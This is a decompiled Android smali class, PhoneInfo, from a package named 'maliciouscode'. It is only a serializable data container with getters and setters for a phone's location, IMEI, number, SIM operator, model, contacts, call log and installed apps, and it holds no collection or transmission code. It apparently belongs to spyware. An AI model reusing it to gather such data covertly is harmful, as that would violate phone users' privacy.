.class public Lcom/lu/maliciouscode/PhoneInfo;
.super Ljava/lang/Object;
.source "PhoneInfo.java"

# interfaces
.implements Ljava/io/Serializable;


# static fields
.field private static final serialVersionUID:J = 0x1L


# instance fields
.field private latitude:Ljava/lang/String;

.field private longitude:Ljava/lang/String;

.field private phoneAppInstalled:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private phoneCallLog:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private phoneContacter:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private phoneFactory:Ljava/lang/String;

.field private phoneIMEI:Ljava/lang/String;

.field private phoneModel:Ljava/lang/String;

.field private phoneNumber:Ljava/lang/String;

.field private phoneSimOperator:Ljava/lang/String;

.field private phoneVersion:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 11
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 19
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneContacter:Ljava/util/List;

    .line 20
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneAppInstalled:Ljava/util/List;

    .line 22
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneCallLog:Ljava/util/List;

    return-void
.end method


# virtual methods
.method public getLatitude()Ljava/lang/String;
    .locals 1

    .prologue
    .line 27
    iget-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->latitude:Ljava/lang/String;

    return-object v0
.end method

.method public getLongitude()Ljava/lang/String;
    .locals 1

    .prologue
    .line 25
    iget-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->longitude:Ljava/lang/String;

    return-object v0
.end method

.method public getPhoneAppInstalled()Ljava/util/List;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 75
    iget-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneAppInstalled:Ljava/util/List;

    return-object v0
.end method

.method public getPhoneCallLog()Ljava/util/List;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 30
    iget-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneCallLog:Ljava/util/List;

    return-object v0
.end method

.method public getPhoneContacter()Ljava/util/List;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 69
    iget-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneContacter:Ljava/util/List;

    return-object v0
.end method

.method public getPhoneFactory()Ljava/lang/String;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneFactory:Ljava/lang/String;

    return-object v0
.end method

.method public getPhoneIMEI()Ljava/lang/String;
    .locals 1

    .prologue
    .line 57
    iget-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneIMEI:Ljava/lang/String;

    return-object v0
.end method

.method public getPhoneModel()Ljava/lang/String;
    .locals 1

    .prologue
    .line 45
    iget-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneModel:Ljava/lang/String;

    return-object v0
.end method

.method public getPhoneNumber()Ljava/lang/String;
    .locals 1

    .prologue
    .line 33
    iget-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneNumber:Ljava/lang/String;

    return-object v0
.end method

.method public getPhoneSimOperator()Ljava/lang/String;
    .locals 1

    .prologue
    .line 63
    iget-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneSimOperator:Ljava/lang/String;

    return-object v0
.end method

.method public getPhoneVersion()Ljava/lang/String;
    .locals 1

    .prologue
    .line 51
    iget-object v0, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneVersion:Ljava/lang/String;

    return-object v0
.end method

.method public setLatitude(Ljava/lang/String;)V
    .locals 0
    .param p1, "latitude"    # Ljava/lang/String;

    .prologue
    .line 28
    iput-object p1, p0, Lcom/lu/maliciouscode/PhoneInfo;->latitude:Ljava/lang/String;

    return-void
.end method

.method public setLongitude(Ljava/lang/String;)V
    .locals 0
    .param p1, "longitude"    # Ljava/lang/String;

    .prologue
    .line 26
    iput-object p1, p0, Lcom/lu/maliciouscode/PhoneInfo;->longitude:Ljava/lang/String;

    return-void
.end method

.method public setPhoneAppInstalled(Ljava/util/List;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;)V"
        }
    .end annotation

    .prologue
    .line 78
    .local p1, "phoneAppInstalled":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    iput-object p1, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneAppInstalled:Ljava/util/List;

    .line 79
    return-void
.end method

.method public setPhoneCallLog(Ljava/util/List;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;)V"
        }
    .end annotation

    .prologue
    .line 31
    .local p1, "phoneCallLog":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    iput-object p1, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneCallLog:Ljava/util/List;

    return-void
.end method

.method public setPhoneContacter(Ljava/util/List;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;)V"
        }
    .end annotation

    .prologue
    .line 72
    .local p1, "phoneContacter":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    iput-object p1, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneContacter:Ljava/util/List;

    .line 73
    return-void
.end method

.method public setPhoneFactory(Ljava/lang/String;)V
    .locals 0
    .param p1, "phoneFactory"    # Ljava/lang/String;

    .prologue
    .line 42
    iput-object p1, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneFactory:Ljava/lang/String;

    .line 43
    return-void
.end method

.method public setPhoneIMEI(Ljava/lang/String;)V
    .locals 0
    .param p1, "phoneIMEI"    # Ljava/lang/String;

    .prologue
    .line 60
    iput-object p1, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneIMEI:Ljava/lang/String;

    .line 61
    return-void
.end method

.method public setPhoneModel(Ljava/lang/String;)V
    .locals 0
    .param p1, "phoneModel"    # Ljava/lang/String;

    .prologue
    .line 48
    iput-object p1, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneModel:Ljava/lang/String;

    .line 49
    return-void
.end method

.method public setPhoneNumber(Ljava/lang/String;)V
    .locals 0
    .param p1, "phoneNumber"    # Ljava/lang/String;

    .prologue
    .line 36
    iput-object p1, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneNumber:Ljava/lang/String;

    .line 37
    return-void
.end method

.method public setPhoneSimOperator(Ljava/lang/String;)V
    .locals 0
    .param p1, "phoneSimOperator"    # Ljava/lang/String;

    .prologue
    .line 66
    iput-object p1, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneSimOperator:Ljava/lang/String;

    .line 67
    return-void
.end method

.method public setPhoneVersion(Ljava/lang/String;)V
    .locals 0
    .param p1, "phoneVersion"    # Ljava/lang/String;

    .prologue
    .line 54
    iput-object p1, p0, Lcom/lu/maliciouscode/PhoneInfo;->phoneVersion:Ljava/lang/String;

    .line 55
    return-void
.end method
